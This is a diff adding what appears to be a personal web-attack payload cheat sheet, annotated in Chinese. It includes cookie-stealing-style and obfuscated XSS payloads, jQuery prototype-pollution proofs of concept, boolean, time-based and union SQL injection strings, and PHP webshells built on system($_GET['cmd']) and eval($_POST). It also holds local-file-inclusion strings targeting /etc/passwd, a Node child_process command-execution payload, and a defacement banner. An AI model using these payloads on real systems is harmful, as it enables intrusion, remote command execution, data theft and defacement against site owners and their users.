@@ -1,0 +1,153 @@
+//  alert(1)
+eval(String.fromCharCode(97,108,101,114,116,40,49,41))
+
+//  alert(document.cookie)
+eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41))
+<?php system($_GET['cmd']); ?>
+
+" onmouseover=alert(document.cookie)>
+
+</script><script>alert(document.cookie)</script><script>
+"><script>alert(document.cookie)</script>
+'><script>alert(document.cookie)</script>
+"><svg/onload=alert(document.cookie)>
+"><ceNteR>123456</CenTer>
+"><h1>X</h1>
+/etc/passwd%00
+<h1><ceNteR onmouseover=alert(1) style="background-color:black;color:green;font-size:50px;">hack by D1stance</CenTer></h1>
+XSS + 原形污染PoC
+"><script>eval(String.fromCharCode(36,46,101,120,116,101,110,100,40,116,114,117,101,44,123,125,44,74,83,79,78,46,112,97,114,115,101,40,39,123,34,95,95,112,114,111,116,111,95,95,34,58,123,34,122,34,58,49,50,51,125,125,39,41,41,59,97,108,101,114,116,40,122,41,59))</script>
+"><script>$.extend(true,{},JSON.parse('{"__proto__":{"z":123}}'));alert(z);</script>
+"><script>$.extend(true,{},JSON.parse('{"__proto__":{"z":"xss"}}'));alert(z);</script>
+
+
+SQLi
+' or 1 or '
+' and sleep(10)-- -
+';WAITFOR DELAY '0:0:10'-- -
+
+(select group_concat(schema_name) from information_schema.schemata)
+基於boolean測試
+基於time based測試
+' AND (SELECT 7902 FROM (SELECT(SLEEP(10)))BGsz) AND 'SXim'='SXim
+' and sleep(10) and 'ab' = 'ab
+
+' Or 2=2 oR '
+' or 1 or '
+' or '1
+1' or 1=1 -- -
+';WAITFOR DELAY '0:0:3'-- -
+
+
+基於學校錯誤訊息之測試 payload
+xss payload : <a+href%3D"javascript:alert(document.cookie)">+[+點我A_A+]+<%2Fa>
+xss payload : <a+href%3D"1"+onclick%3D"alert(document.cookie)">+[+點我A_A+]+<%2Fa>
+
+store xss
+"><input type="button" value="xss test" onclick=alert(document.cookie)>
+<a href=javascript:alert(document.cookie)>xss test</a>
+<a+href%3Djavascript:alert(document.cookie)>+[+點我A_A+]+<%2Fa>
+<svg/onclick=alert(document.cookie)>
+
+"><svg/onload=javascript:confirm(1)>
+
+
+"><ceNteR><h1>XSS test</h1></CenTer>
+"><h1>1</h1>
+"><svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+" onload=$.extend(true,{},JSON.parse('{"__proto__":{"z":"xss"}}'));alert(z)
+" onmouseover=alert(document.cookie)><"
+" onload=alert(document.cookie)><"
+" onmouseover=$.extend(true,{},JSON.parse('{"__proto__":{"z":"xss"}}'));alert(z);><"
+" onerror=alert(1)//
+"><sCrIpt>document.write(123456)</scRipT>
+"><svg/onload=alert(document.cookie)>
+"><svg/onload=confirm(document.cookie)>
+"><svg/onload=$.extend(true,{},JSON.parse('{"__proto__":{"z":123}}'));alert(z)>
+
+
+onscroll=alert(26)
+"><!--
+
+"><a href=javascript:alert(1)>xss</a>
+</html></body></script></a></tr></head></div></tr></td></table>
+"><sCr<sCrIpt>Ipt>alert(1)</sc<sCrIpt>RipT>
+
+"><svg/onload=alert(1)>
+"><svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+"><svg/onload=alert('XSS')>
+
+"><img src=1 onerror=$.extend(true,{},JSON.parse('{"__proto__":{"z":"XSS"}}'));alert(z)>
+
+
+"><img src=1 onerror=alert(1)>
+"><img src=1 onmouseover=alert(1)>
+"><IMG SRC=JaVaScRiPt:alert(1)>
+"><IMG SRC=jav ascript:alert(1);>
+"><img src=1 onerror=alert("xss test")>
+
+<video src=x onerror=prompt(1)>
+<audio src=x onerror=prompt(1)>
+
+<q/oncut=alert(1)>
+
+"><input type="button" value="Click me" onclick="alert(1)">
+"><input type="" onmouseover="alert(1)">
+
+\x3c img src onerror=alert(1) \x3e
+
+"><a onmouseover="alert(document.cookie)"\>xxs link\</a\>
+<div style=color:expression(confirm(1))>
+"><div style="color: expression(alert(1))">
+
+<svg><script>alert&#40/1/&#41</script> // 通杀所有浏览器
+
+"><BR SIZE="&*{alert('XSS')}">
+"><BR SIZE=&{alert(1)}>
+
+sql injection
+
+999%aa' union select 1,2 %23
+1%df%27--
+
+' OR 2=2 or '
+' OR '2'='2' or '
+' or 1 or '
+
+' OR 2=2 --
+' OR 2=2 #
+' OR '2'='2' --
+' OR '2'='2' #
+' OR ''=''#
+
+char(0x27)
+' union select @version--
+union select group_concat(table_name,char(32)) from information _schema.tables where table__schema=database()
+
+
+webshell
+select "<?php eval($_POST[1]);?>"
+<? php system('dir||ls'); ?>
+<? php system($_GET['cmd']); ?>
+<?php system($_GET['cmd']);?>
+
+LFI
+/etc/passwd%00
+file:///etc/passwd%00
+php://input&cmd=ls
+php://filter
+expect://ls
+
+
+printenv.pl的XSS payload
+http://[target]/cgi-bin/printenv/href="bad"
+http://[target]/cgi-bin/printenv.pl?acuparam=>"><ScRiPt>alert(1)</ScRiPt>
+
+
+原形污染PoC
+// jquery 3.4.0版本以前都有效
+$.extend(true, {}, JSON.parse('{"__proto__": {"z": 123}}'));console.log(z);
+
+{"z":"return global.process.mainModule.constructor._load('child_process').execSync('ls');}
+
+
